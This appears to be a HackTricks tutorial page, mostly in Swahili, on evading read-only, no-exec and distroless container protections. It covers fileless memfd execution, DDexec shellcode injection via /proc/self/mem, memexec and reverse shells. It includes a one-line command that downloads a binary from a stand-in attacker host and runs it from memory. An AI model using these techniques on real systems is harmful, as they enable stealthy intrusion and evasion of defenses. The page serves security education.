# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videos

Katika videos zifuatazo unaweza kupata techniques zilizotajwa kwenye ukurasa huu zikielezwa kwa kina zaidi:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>

## read-only / no-exec scenario

Inazidi kuwa kawaida kukutana na linux machines zilizo-mountiwa kwa **read-only (ro) file system protection**, hasa kwenye containers. Hii ni kwa sababu kuendesha container yenye ro file system ni rahisi kama kuweka **`readOnlyRootFilesystem: true`** kwenye `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Hata hivyo, hata kama file system ime-mountiwa kama ro, **`/dev/shm`** bado itaweza kuandikiwa, kwa hiyo si kweli kwamba hatuwezi kuandika chochote kwenye disk. Hata hivyo, folder hii itakuwa **mounted with no-exec protection**, kwa hiyo ukidownload binary hapa **hutaweza kui-execute**.

> [!WARNING]
> Kwa mtazamo wa red team, hii inafanya iwe **ngumu kudownload na ku-execute** binaries ambazo hazipo tayari kwenye system (kama backdoors au enumerators kama `kubectl`).

## Easiest bypass: Scripts

Kumbuka kwamba nilitaja binaries; unaweza **ku-execute script yoyote** mradi interpreter yake iko ndani ya machine, kama **shell script** ikiwa `sh` ipo au **python** **script** ikiwa `python` imewekwa.

Hata hivyo, hii pekee haitoshi ku-execute binary backdoor yako au binary tools nyingine unazoweza kuhitaji ku-run.

## Memory Bypasses

Ukitaka ku-execute binary lakini file system hairuhusu, njia bora ya kufanya hivyo ni **kui-execute kutoka kwenye memory**, kwa sababu **protections hazitumiki huko**.

### FD + exec syscall bypass

Ikiwa una powerful script engines ndani ya machine, kama **Python**, **Perl**, au **Ruby**, unaweza kudownload binary ya ku-execute kutoka kwenye memory, kuihifadhi kwenye memory file descriptor (`create_memfd` syscall), ambayo haitalindwa na protections hizo, kisha uitishe **`exec` syscall** ukionyesha **fd kama file ya ku-execute**.

Kwa hili unaweza kutumia kwa urahisi project ya [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Unaweza kuipa binary, nayo itatengeneza script katika language iliyoonyeshwa ikiwa na **binary iliyocompressiwa na b64 encoded**, pamoja na instructions za **ku-decode na ku-decompress** ndani ya **fd** iliyotengenezwa kwa kuita `create_memfd` syscall, na call ya **exec** syscall ili kui-run.

> [!WARNING]
> Hii haifanyi kazi katika scripting languages nyingine kama PHP au Node kwa sababu hazina **default way to call raw syscalls** kutoka kwenye script, kwa hiyo haiwezekani kuita `create_memfd` ili kutengeneza **memory fd** ya kuhifadhi binary.
>
> Zaidi ya hayo, kutengeneza **regular fd** yenye file katika `/dev/shm` hakutafanya kazi, kwa sababu hutaruhusiwa kui-run kutokana na **no-exec protection** kutumika.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ni technique inayokuruhusu **kubadilisha memory ya process yako mwenyewe** kwa ku-overwrite **`/proc/self/mem`**.

Kwa hiyo, kwa **kudhibiti assembly code** inayotekelezwa na process, unaweza kuandika **shellcode** na "ku-mutate" process ili **ku-execute arbitrary code yoyote**.

> [!TIP]
> **DDexec / EverythingExec** itakuruhusu kupakia na **ku-execute** **shellcode** yako mwenyewe au **binary yoyote** kutoka kwenye **memory**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Kwa maelezo zaidi kuhusu technique hii, angalia Github au:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ni hatua inayofuata kwa kawaida ya DDexec. Ni **DDexec shellcode demonised**, hivyo kila unapotaka **run binary tofauti**, huhitaji kuzindua tena DDexec; unaweza tu ku-run memexec shellcode kupitia technique ya DDexec, kisha **kuwasiliana na daemon hii ili kupitisha binaries mpya za kupakia na ku-run**.

Unaweza kupata mfano wa jinsi ya kutumia **memexec ku-execute binaries kutoka kwenye PHP reverse shell** katika [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Kwa madhumuni yanayofanana na DDexec, technique ya [**memdlopen**](https://github.com/arget13/memdlopen) huruhusu **njia rahisi zaidi ya kupakia binaries** kwenye memory ili kuzitekeleza baadaye. Inaweza pia kuruhusu kupakia binaries zenye dependencies.

## Distroless Bypass

Kwa maelezo maalum kuhusu **distroless ni nini hasa**, inasaidia lini, haisaidii lini, na jinsi inavyobadilisha post-exploitation tradecraft kwenye containers, angalia:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Distroless ni nini

Distroless containers huwa na **components za msingi kabisa zinazohitajika ku-run application au service maalum**, kama vile libraries na runtime dependencies, lakini huacha components kubwa kama package manager, shell, au system utilities.

Lengo la distroless containers ni **kupunguza attack surface ya containers kwa kuondoa components zisizo za lazima** na kupunguza idadi ya vulnerabilities zinazoweza ku-exploitwa.

### Reverse Shell

Katika distroless container huenda **usipate hata `sh` au `bash`** ili kupata shell ya kawaida. Pia hutapata binaries kama `ls`, `whoami`, `id`... kila kitu ambacho kwa kawaida huwa una-run kwenye system.

> [!WARNING]
> Kwa hiyo, **hutaweza kupata **reverse shell** au ku-**enumerate** system kama kawaida.

Hata hivyo, ikiwa container iliyo-compromise ina-run, kwa mfano, Flask web app, basi Python imewekwa, na hivyo unaweza kupata **Python reverse shell**. Ikiwa ina-run Node, unaweza kupata Node rev shell, na hali ni hiyo hiyo kwa karibu **scripting language** yoyote.

> [!TIP]
> Kwa kutumia scripting language unaweza **ku-**enumerate system** ukitumia uwezo wa language hiyo.

Ikiwa hakuna protections za **`read-only/no-exec`**, unaweza kutumia reverse shell yako vibaya **kuandika binaries zako kwenye file system** na **kuzitekeleza**.

> [!TIP]
> Hata hivyo, katika aina hii ya containers protections hizi kwa kawaida zitakuwepo, lakini unaweza kutumia **mbinu za awali za memory execution kuzipita**.

Unaweza kupata **mifano** ya jinsi ya **ku-exploit baadhi ya vulnerabilities za RCE** ili kupata **reverse shells** za scripting languages na ku-execute binaries kutoka memory katika [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

## Marejeo

- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)

{{#include ../../../../banners/hacktricks-training.md}}
